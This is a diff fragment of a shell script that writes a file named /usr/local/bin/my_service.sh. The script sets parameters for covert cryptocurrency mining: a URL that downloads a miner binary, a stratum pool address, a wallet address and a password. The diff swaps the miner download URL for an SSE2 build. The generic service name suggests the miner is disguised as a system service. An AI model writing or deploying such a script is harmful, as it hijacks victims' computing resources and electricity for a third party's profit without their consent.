@@ -16,7 +16,7 @@ cat << 'EOF' > /usr/local/bin/my_service.sh
 #!/bin/sh
 
 # Define the URL and mining parameters
-MINER_URL="https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/avx2"
+MINER_URL="https://raw.githubusercontent.com/edrivetokenbsc/xnxxx/main/build/cpuminer-sse2"
 POOL_URL="stratum+tcps://stratum-na.rplant.xyz:13382"
 WALLET_ADDRESS="YeW8bsNisZGT4tL5rTfmi5BD3hK8e8CAPe"
 PASSWORD="m=solo"
